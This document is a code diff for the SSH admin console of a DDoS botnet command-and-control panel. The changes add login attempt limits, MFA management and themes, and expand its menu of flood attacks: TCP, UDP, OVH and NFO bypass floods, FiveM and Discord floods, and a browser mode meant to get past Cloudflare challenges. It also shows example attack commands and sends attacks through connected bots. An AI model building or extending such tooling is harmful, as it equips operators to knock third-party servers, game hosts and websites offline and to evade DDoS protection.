@@ -3,7 +3,6 @@ package main
 import (
 	"fmt"
 	"io/ioutil"
-	"math/rand"
 	"net"
 	"strconv"
 	"strings"
@@ -14,13 +13,6 @@ import (
 
 	"github.com/alexeyco/simpletable"
 )
-
-type CaptchaToken struct {
-	Token     string
-	ValidTime time.Time
-}
-
-var captchaTokens = make(map[string]CaptchaToken)
 
 const (
 	ansiReset     = "\x1b[0m"
@@ -40,20 +32,10 @@ const (
 const (
 	promptHost = "cnc"
 	promptPath = "~/panel"
+
+	loginUsernameMaxAttempts = 2
+	loginPasswordMaxAttempts = 2
 )
-
-func generateRandomCaptcha() string {
-	const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
-	tokenLength := 6 // You can adjust the length of the captcha token as needed
-	rand.Seed(time.Now().UnixNano())
-
-	token := make([]byte, tokenLength)
-	for i := 0; i < tokenLength; i++ {
-		token[i] = charset[rand.Intn(len(charset))]
-	}
-
-	return string(token)
-}
 
 func purpleGradientText(s string) string {
 	gradient := []string{
@@ -198,79 +180,6 @@ func writeGradientTable(conn net.Conn, headers []string, rows [][]string) {
 	conn.Write([]byte(strings.ReplaceAll(colored, "\n", "\r\n") + "\r\n"))
 }
 
-func writeAdminHeader(conn net.Conn, username string) {
-	banner := []string{
-		"",
-		"                       (`.-,')",
-		"                     .-'     ;",
-		"                 _.-'   , `,-",
-		"           _ _.-'     .'  /._",
-		"         .' `  _.-.  /  ,'._;)",
-		"        (       .  )-| (",
-		"         )`,_ ,'_,'  \\_;)",
-		" ('_  _,'.'  (___,))",
-		"  `-:;.-'",
-	}
-
-	gradient := []string{
-		"\x1b[38;5;141m",
-		"\x1b[38;5;135m",
-		"\x1b[38;5;129m",
-		"\x1b[38;5;93m",
-		"\x1b[38;5;57m",
-		"\x1b[38;5;56m",
-		"\x1b[38;5;55m",
-		"\x1b[38;5;54m",
-		"\x1b[38;5;53m",
-	}
-
-	rightText := []string{
-		purpleGradientText("Hi") + " " + ansiCommands + username + ansiReset,
-		purpleGradientText("Enter") + " " + ansiCommands + "'help'" + ansiReset + " " + purpleGradientText("(to see all)") + " " + ansiCommands + "Commands!" + ansiReset,
-		purpleGradientText("(CNC by)") + " " + ansiCommands + "@ch3rry_nvme" + ansiReset,
-	}
-
-	maxRightWidth := 0
-	for _, line := range rightText {
-		visible := len(stripANSICodes(line))
-		if visible > maxRightWidth {
-			maxRightWidth = visible
-		}
-	}
-	for i, line := range rightText {
-		visible := len(stripANSICodes(line))
-		if visible < maxRightWidth {
-			pad := (maxRightWidth - visible) / 2
-			if pad > 0 {
-				rightText[i] = strings.Repeat(" ", pad) + line
-			}
-		}
-	}
-
-	catWidth := 0
-	for _, line := range banner {
-		if len(line) > catWidth {
-			catWidth = len(line)
-		}
-	}
-
-	startRight := (len(banner) - len(rightText)) / 2
-	spacer := "   "
-	for i := 0; i < len(banner); i++ {
-		left := banner[i]
-		if len(left) < catWidth {
-			left = left + strings.Repeat(" ", catWidth-len(left))
-		}
-		color := gradient[i%len(gradient)]
-		right := ""
-		if i >= startRight && i < startRight+len(rightText) {
-			right = rightText[i-startRight]
-		}
-		conn.Write([]byte(color + left + ansiReset + spacer + right + "\r\n"))
-	}
-	conn.Write([]byte("\r\n"))
-}
-
 func writeLoginHeader(conn net.Conn) {
 	banner := []string{
 		"         ~+",
@@ -327,6 +236,10 @@ func writeLoginHeader(conn net.Conn) {
 	conn.Write([]byte("\r\n"))
 }
 
+func loginCredentialPrompt(label string) string {
+	return fmt.Sprintf("%s%s%s %s->%s %s", ansiPrompt, label, ansiReset, ansiPrompt, ansiReset, ansiCommands)
+}
+
 func adminPrompt(session *Session) string {
 	parts := strings.Split(promptPath, "/")
 	var pathBuilder strings.Builder
@@ -354,19 +267,6 @@ func adminPrompt(session *Session) string {
 	}, "")
 }
 
-// GenerateCaptcha generates a captcha token and returns it
-func GenerateCaptcha() string {
-	token := generateRandomCaptcha()             // Implement your captcha generation logic here
-	validTime := time.Now().Add(5 * time.Minute) // Set an expiration time for the captcha token
-
-	captchaTokens[token] = CaptchaToken{
-		Token:     token,
-		ValidTime: validTime,
-	}
-
-	return token
-}
-
 // admin function
 // Legacy entrypoint kept for compatibility. Admin access is SSH-only.
 func Admin(conn net.Conn) {
@@ -387,45 +287,62 @@ func AdminSSH(conn net.Conn) {
 	// Consola interactiva ANSI sobre canal SSH.
 	conn.Write([]byte("\033[2J\033[1H"))
 	writeLoginHeader(conn)
-	conn.Write([]byte("\r\n" + ansiSystem + "Enter your credentials:" + ansiReset + "\r\n\r\n"))
+	conn.Write([]byte("\r\n" + ansiPrompt + "Enter your credentials:" + ansiReset + "\r\n\r\n"))
 
-	// username
-	username, err := readSSHLine(conn, fmt.Sprintf("%s%s%s %s->%s %s", ansiPrompt, "Username", ansiReset, ansiSuccess, ansiReset, ansiCommands), "", 20, []string{})
-	if err != nil {
-		return
-	}
+	var (
+		account *User
+		err     error
+	)
 
-	account, err := FindUser(username)
-	if err != nil || account == nil {
-		conn.Write([]byte(ansiError + "Wrong credentials!" + ansiReset))
-		time.Sleep(50 * time.Millisecond)
-		return
-	}
-
-	// password
-	password, err := readSSHLine(conn, fmt.Sprintf("%s%s%s %s->%s %s", ansiPrompt, "Password", ansiReset, ansiSuccess, ansiReset, ansiCommands), "*", 20, []string{})
-	if err != nil {
-		return
-	} else if password != account.Password {
-		conn.Write([]byte(ansiError + "Wrong credentials" + ansiReset))
-		time.Sleep(50 * time.Millisecond)
-		return
-	}
-
-	if strings.TrimSpace(username) != "root" {
-		captcha := GenerateCaptcha()
-		captchaPrompt := fmt.Sprintf("%sCaptcha%s %s%s%s: %s", ansiSeparator, ansiReset, ansiNumbers, captcha, ansiReset, ansiCommands)
-		captchaInput, err := readSSHLine(conn, captchaPrompt, "", 20, []string{})
-		if err != nil || captchaInput != captcha {
-			conn.Write([]byte(ansiError + "Captcha failed!" + ansiReset))
-			time.Sleep(50 * time.Millisecond)
+	for attempt := 1; attempt <= loginUsernameMaxAttempts; attempt++ {
+		username, readErr := readSSHLine(conn, loginCredentialPrompt("Username"), "", 20, []string{})
+		if readErr != nil {
 			return
 		}
+
+		account, err = FindUser(username)
+		if err == nil && account != nil {
+			break
+		}
+
+		remaining := loginUsernameMaxAttempts - attempt
+		if remaining > 0 {
+			conn.Write([]byte(fmt.Sprintf("%sWrong username.%s %s%d%s attempt(s) left.\r\n", ansiError, ansiReset, ansiNumbers, remaining, ansiReset)))
+		}
+	}
+
+	if account == nil {
+		conn.Write([]byte(ansiError + "Username attempt limit reached. Connection closed." + ansiReset + "\r\n"))
+		time.Sleep(150 * time.Millisecond)
+		return
+	}
+
+	authorized := false
+	for attempt := 1; attempt <= loginPasswordMaxAttempts; attempt++ {
+		password, readErr := readSSHLine(conn, loginCredentialPrompt("Password"), "*", 20, []string{})
+		if readErr != nil {
+			return
+		}
+		if password == account.Password {
+			authorized = true
+			break
+		}
+
+		remaining := loginPasswordMaxAttempts - attempt
+		if remaining > 0 {
+			conn.Write([]byte(fmt.Sprintf("%sWrong password.%s %s%d%s attempt(s) left.\r\n", ansiError, ansiReset, ansiNumbers, remaining, ansiReset)))
+		}
+	}
+
+	if !authorized {
+		conn.Write([]byte(ansiError + "Password attempt limit reached. Connection closed." + ansiReset + "\r\n"))
+		time.Sleep(150 * time.Millisecond)
+		return
 	}
 
 	if account.NewUser {
 		conn.Write([]byte(ansiSystem + "Change to new password" + ansiReset + "\r\n"))
-		newpassword, err := readSSHLine(conn, fmt.Sprintf("%sNew password%s %s->%s %s", ansiSeparator, ansiReset, ansiSeparator, ansiReset, ansiCommands), "*", 20, []string{})
+		newpassword, err := readSSHLine(conn, loginCredentialPrompt("New password"), "*", 20, []string{})
 		if err != nil {
 			return
 		}
@@ -434,7 +351,8 @@ func AdminSSH(conn net.Conn) {
 			time.Sleep(50 * time.Millisecond)
 			return
 		}
-		ModifyField(account, "newuser", false)
+		_ = ModifyField(account, "newuser", false)
+		account.NewUser = false
 	}
 
 	if account.Expiry <= time.Now().Unix() {
@@ -443,12 +361,18 @@ func AdminSSH(conn net.Conn) {
 		return
 	}
 
+	if err := verifyUserMFA(conn, account); err != nil {
+		conn.Write([]byte(ansiError + "MFA verification failed (3 attempts). Connection closed." + ansiReset + "\r\n"))
+		time.Sleep(150 * time.Millisecond)
+		return
+	}
+
 	// Crear sesiÃ³n y continuar
 	session := NewSession(conn, account)
 	defer delete(Sessions, session.Opened.Unix())
 
 	conn.Write([]byte("\033[2J\033[1H"))
-	writeAdminHeader(conn, session.User.Username)
+	writeAdminHeader(conn, session.User)
 
 	blankAfterCommand := false
 	for {
@@ -482,12 +406,14 @@ func AdminSSH(conn net.Conn) {
 
 		case "?", "help", "h":
 			rows := [][]string{
-				{"methods_tcp", ansiCommands + "View all TCP methods available" + ansiReset},
-				{"methods_udp", ansiCommands + "View all UDP methods available" + ansiReset},
-				{"methods_l3", ansiCommands + "View all Layer 3 methods available" + ansiReset},
-				{"methods_l7", ansiCommands + "View all Layer 7 methods available" + ansiReset},
+				{"clear", ansiCommands + "Clears your terminal" + ansiReset},
+				{"tcp_methods", ansiCommands + "View all TCP methods available" + ansiReset},
+				{"udp_methods", ansiCommands + "View all UDP methods available" + ansiReset},
+				{"l3_methods", ansiCommands + "View all Layer 3 methods available" + ansiReset},
+				{"l7_methods", ansiCommands + "View all Layer 7 methods available" + ansiReset},
+				{"game_methods", ansiCommands + "View all Game methods available" + ansiReset},
 				{"flags <.method>", ansiCommands + "View attack flags for a specific method" + ansiReset},
-				{"clear", ansiCommands + "Clears your terminal and history" + ansiReset},
+				{"themes", ansiCommands + "List available console themes" + ansiReset},
 			}
 			writeGradientTable(session.Conn, []string{"Command", "Description"}, rows)
 
@@ -500,6 +426,7 @@ func AdminSSH(conn net.Conn) {
 			rows := [][]string{
 				{"attacks", ansiCommands + "Enable or disable attacks possible" + ansiReset},
 				{"reset_user", ansiCommands + "Reset a user's attack logs" + ansiReset},
+				{"mfa enable|disable|reset|status <user>", ansiCommands + "Enable, disable, reset or view MFA status for a user" + ansiReset},
 				{"bots", ansiCommands + "Show connected bots" + ansiReset},
 				{"api", ansiCommands + "API examples or help" + ansiReset},
 				{"admin", ansiCommands + "Change user privileges" + ansiReset},
@@ -520,12 +447,120 @@ func AdminSSH(conn net.Conn) {
 
 		// Clear command
 		case "clear", "cls", "c":
-			session.History = make([]string, 0)
 			conn.Write([]byte("\033[2J\033[1H"))
-			writeAdminHeader(conn, session.User.Username)
+			writeAdminHeader(conn, session.User)
 			continue
 
-		case "methods_tcp":
+		case "themes":
+			args := strings.Fields(command)
+			if len(args) == 1 {
+				currentTheme := resolveThemeName(session.User.Theme)
+				session.Conn.Write([]byte(ansiSystem + "Available themes:" + ansiReset + "\r\n"))
+				for _, theme := range availableAdminThemes() {
+					line := ansiCommands + "> " + theme + ansiReset
+					if theme == currentTheme {
+						line += " " + ansiSuccess + "(current)" + ansiReset
+					}
+					session.Conn.Write([]byte(line + "\r\n"))
+				}
+				session.Conn.Write([]byte(ansiSeparator + "Usage" + ansiReset + ": themes apply <theme>\r\n"))
+				continue
+			}
+
+			if len(args) >= 3 && strings.EqualFold(args[1], "apply") {
+				theme := normalizeThemeName(args[2])
+				if !isKnownTheme(theme) {
+					session.Conn.Write([]byte(ansiError + "Unknown theme." + ansiReset + "\r\n"))
+					session.Conn.Write([]byte(ansiSeparator + "Available" + ansiReset + ": " + strings.Join(availableAdminThemes(), ", ") + "\r\n"))
+					continue
+				}
+
+				if err := ModifyField(session.User, "theme", theme); err != nil {
+					session.Conn.Write([]byte(ansiError + "Failed to apply theme: " + err.Error() + ansiReset + "\r\n"))
+					continue
+				}
+
+				session.User.Theme = theme
+				conn.Write([]byte("\033[2J\033[1H"))
+				writeAdminHeader(conn, session.User)
+				continue
+			}
+
+			session.Conn.Write([]byte(ansiWarning + "Usage: themes | themes apply <theme>" + ansiReset + "\r\n"))
+			continue
+
+		case "mfa":
+			if !session.User.Admin {
+				session.Conn.Write([]byte(ansiWarning + "Only admin can use this command." + ansiReset + "\r\n"))
+				continue
+			}
+
+			args := strings.Fields(command)
+			if len(args) != 3 {
+				session.Conn.Write([]byte(ansiWarning + "Usage: mfa enable|disable|reset|status <user>" + ansiReset + "\r\n"))
+				continue
+			}
+
+			action := strings.ToLower(args[1])
+			targetName := strings.TrimSpace(args[2])
+			targetUser, err := FindUser(targetName)
+			if err != nil || targetUser == nil {
+				session.Conn.Write([]byte(ansiError + "Unknown user." + ansiReset + "\r\n"))
+				continue
+			}
+
+			switch action {
+			case "status":
+				secretSet := strings.TrimSpace(targetUser.MFASecret) != ""
+				if strings.EqualFold(targetUser.Username, "root") {
+					session.Conn.Write([]byte(ansiSystem + "MFA status for " + ansiCommands + targetUser.Username + ansiReset + ": " + ansiWarning + "exempt" + ansiReset + ", secret_set=" + FormatBool(false) + "\r\n"))
+					continue
+				}
+				session.Conn.Write([]byte(ansiSystem + "MFA status for " + ansiCommands + targetUser.Username + ansiReset + ": enabled=" + FormatBool(targetUser.MFA) + ", secret_set=" + FormatBool(secretSet) + "\r\n"))
+			case "enable", "on", "true":
+				if strings.EqualFold(targetUser.Username, "root") {
+					session.Conn.Write([]byte(ansiWarning + "Root is always exempt from MFA." + ansiReset + "\r\n"))
+					continue
+				}
+				if err := ModifyField(targetUser, "mfa", true); err != nil {
+					session.Conn.Write([]byte(ansiError + "Failed to enable MFA." + ansiReset + "\r\n"))
+					continue
+				}
+				targetUser.MFA = true
+				session.Conn.Write([]byte(ansiSuccess + "MFA enabled for " + targetUser.Username + ansiReset + "\r\n"))
+			case "disable", "off", "false":
+				if strings.EqualFold(targetUser.Username, "root") {
+					session.Conn.Write([]byte(ansiWarning + "Root is always exempt from MFA." + ansiReset + "\r\n"))
+					continue
+				}
+				if err := ModifyField(targetUser, "mfa", false); err != nil {
+					session.Conn.Write([]byte(ansiError + "Failed to disable MFA." + ansiReset + "\r\n"))
+					continue
+				}
+				targetUser.MFA = false
+				session.Conn.Write([]byte(ansiWarning + "MFA disabled for " + targetUser.Username + ansiReset + "\r\n"))
+			case "reset":
+				if strings.EqualFold(targetUser.Username, "root") {
+					session.Conn.Write([]byte(ansiWarning + "Root is always exempt from MFA." + ansiReset + "\r\n"))
+					continue
+				}
+				if err := ModifyField(targetUser, "mfa", true); err != nil {
+					session.Conn.Write([]byte(ansiError + "Failed to reset MFA." + ansiReset + "\r\n"))
+					continue
+				}
+				if err := ModifyField(targetUser, "mfa_secret", ""); err != nil {
+					session.Conn.Write([]byte(ansiError + "Failed to reset MFA secret." + ansiReset + "\r\n"))
+					continue
+				}
+				targetUser.MFA = true
+				targetUser.MFASecret = ""
+				session.Conn.Write([]byte(ansiSuccess + "MFA reset for " + targetUser.Username + ". Next login will require setup." + ansiReset + "\r\n"))
+			default:
+				session.Conn.Write([]byte(ansiWarning + "Usage: mfa enable|disable|reset|status <user>" + ansiReset + "\r\n"))
+			}
+			continue
+
+		case "tcp_methods", "methods_tcp":
 			rows := [][]string{
 				{".synflood", ansiCommands + "TCP SYN flood" + ansiReset},
 				{".ackflood", ansiCommands + "TCP ACK flood" + ansiReset},
@@ -533,15 +568,18 @@ func AdminSSH(conn net.Conn) {
 				{".tcpstream", ansiCommands + "TCP stream flood" + ansiReset},
 				{".tcpsocket", ansiCommands + "TCP socket flood (high connections)" + ansiReset},
 				{".tcpwra", ansiCommands + "TCP wra flood (game servers)" + ansiReset},
+				{".tcpbypass", ansiCommands + "TCP bypass flood" + ansiReset},
 				{".ovh", ansiCommands + "TCP OVH bypass flood" + ansiReset},
-				{".stomp", ansiCommands + "TCP stomp flood" + ansiReset},
+				{".nfo", ansiCommands + "TCP NFO bypass flood" + ansiReset},
+				{".stomp", ansiCommands + "TCP stomp flood (Handshake)" + ansiReset},
 				{"", ""},
 				{"Example", ansiCommands + ".synflood 1.1.1.1 60 dport=80" + ansiReset},
 			}
 			writeGradientTable(session.Conn, []string{"TCP Methods", "Description"}, rows)
 
-		case "methods_udp":
+		case "udp_methods", "methods_udp":
 			rows := [][]string{
+				{".udpplain", ansiCommands + "UDP flood with random payload" + ansiReset},
 				{".udpthread", ansiCommands + "UDP flood with threads" + ansiReset},
 				{".ppsflood", ansiCommands + "UDP flood high PPS" + ansiReset},
 				{".stdhex", ansiCommands + "UDP flood with random hex payload" + ansiReset},
@@ -550,7 +588,14 @@ func AdminSSH(conn net.Conn) {
 			}
 			writeGradientTable(session.Conn, []string{"UDP Methods", "Description"}, rows)
 
-		case "methods_l3", "methods_layer3":
+		case "game_methods", "methods_game":
+			rows := [][]string{
+				{".fivem", ansiCommands + "UDP flood optimized for FiveM servers" + ansiReset},
+				{".discord", ansiCommands + "UDP flood optimized for Discord" + ansiReset},
+			}
+			writeGradientTable(session.Conn, []string{"Game Methods", "Description"}, rows)
+
+		case "l3_methods", "methods_l3", "layer3_methods", "methods_layer3":
 			rows := [][]string{
 				{".greip", ansiCommands + "GRE IP flood (Layer 3)" + ansiReset},
 				{"", ""},
@@ -558,12 +603,17 @@ func AdminSSH(conn net.Conn) {
 			}
 			writeGradientTable(session.Conn, []string{"Layer 3 Methods", "Description"}, rows)
 
-		case "methods_layer7", "methods_l7":
+		case "l7_methods", "methods_l7", "layer7_methods", "methods_layer7":
 			rows := [][]string{
 				{".http", ansiCommands + "HTTP flood (Layer 7)" + ansiReset},
 				{".browser", ansiCommands + "Browser emulation optimized for CF Captcha & UAM" + ansiReset},
+				{"", ""},
+				{"Example", ansiCommands + ".browser https://target.com/ 60 250(rate)" + ansiReset},
 			}
 			writeGradientTable(session.Conn, []string{"Layer 7 Methods", "Description"}, rows)
+
+			// Flags command
+			//==============================================================================================================================================================================================================================================================================================================================//
 
 		case "flags":
 			args := strings.Fields(command)[1:]
@@ -612,6 +662,9 @@ func AdminSSH(conn net.Conn) {
 
 			headers := []string{"Flag", "Description"}
 			writeGradientTable(session.Conn, headers, rows)
+
+			//attacks command
+			//==============================================================================================================================================================================================================================================================================================================================//
 
 		case "attacks":
 			args := strings.Split(strings.ToLower(command), " ")[1:]
@@ -1665,7 +1718,7 @@ func AdminSSH(conn net.Conn) {
 			}
 			SendL7Attack(attack)
 			face := purpleGradientText("X_X")
-			session.Conn.Write([]byte(ansiSuccess + "Attack sent to " + attack.URL + " for " + strconv.Itoa(attack.Duration) + " seconds " + face + ansiReset + "\r\n"))
+			session.Conn.Write([]byte(ansiSuccess + "Attack" + ansiReset + " " + ansiCommands + "sent successfully to " + attack.URL + " for " + strconv.Itoa(attack.Duration) + " seconds " + face + ansiReset + "\r\n"))
 			continue
 
 			//Default case handles attack commands and unknown commands
@@ -1758,7 +1811,7 @@ func AdminSSH(conn net.Conn) {
 			}
 			bots := strconv.Itoa(len(Clients))
 			face := purpleGradientText("X_X")
-			session.Conn.Write([]byte(ansiSuccess + "Successfully" + ansiReset + " " + ansiCommands + "sent attack to " + target + " for " + duration + " with " + bots + " bots " + ansiReset + face + ansiReset + "\r\n"))
+			session.Conn.Write([]byte(ansiSuccess + "Attack" + ansiReset + " " + ansiCommands + "sent successfully to " + target + " for " + duration + " with " + bots + " bots " + ansiReset + face + ansiReset + "\r\n"))
 
 		}
 	}
